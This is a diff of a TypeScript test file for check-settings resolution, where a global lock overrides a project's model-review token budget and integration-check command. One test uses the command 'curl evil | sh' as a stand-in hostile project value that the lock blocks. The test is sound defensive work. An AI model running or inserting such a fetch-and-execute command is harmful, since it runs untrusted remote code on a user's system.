@@ -107,7 +107,9 @@ describe("effective check settings", () => {
   it("ignores a looser project budget under a lock, honours a tighter one, and applies the looser one again after unlock", () => withStore((store) => {
     setProject(store, { modelReview: { budgetTokens: 800_000 } });
     setGlobal(store, { modelReview: { budgetTokens: 500_000 }, locks: ["modelReview.budgetTokens"] });
-    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(G(500_000, "global"));
+    // Spec §4.2: the ignored looser value is still shown (struck through, "overridden by lock"), so the read carries it.
+    // mutation: drop the ignored project value from the read -> no overriddenByLock, red
+    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual({ ...G(500_000, "global"), overriddenByLock: 800_000 });
     expect(effectiveChecks(store, "repo").locks).toEqual(["modelReview.budgetTokens"]);
     setProject(store, { modelReview: { budgetTokens: 300_000 } });
     expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(P(300_000, "global"));
@@ -118,13 +120,13 @@ describe("effective check settings", () => {
     setGlobal(store, { locks: ["modelReview.budgetTokens"] });
     expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual(P(800_000, "global"));
     setProject(store, { modelReview: { budgetTokens: 2_000_000 } });
-    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual({ ...B(1_000_000), lockedBy: "global" });
+    expect(effectiveChecks(store, "repo").kinds["model-review"].budgetTokens).toEqual({ ...B(1_000_000), lockedBy: "global", overriddenByLock: 2_000_000 });
   }));
 
   it("under a command lock, a different project command is ignored; none (null) or the same one applies", () => withStore((store) => {
     setGlobal(store, { integrationCheck: { command: "npm test" }, locks: ["integrationCheck.command"] });
     setProject(store, { integrationCheck: { command: "curl evil | sh" } });
-    expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual(G("npm test", "global"));
+    expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual({ ...G("npm test", "global"), overriddenByLock: "curl evil | sh" });
     setProject(store, { integrationCheck: { command: null } });
     expect(effectiveChecks(store, "repo").kinds["integration-check"].command).toEqual(P(null, "global"));
     setProject(store, { integrationCheck: { command: "npm test" } });
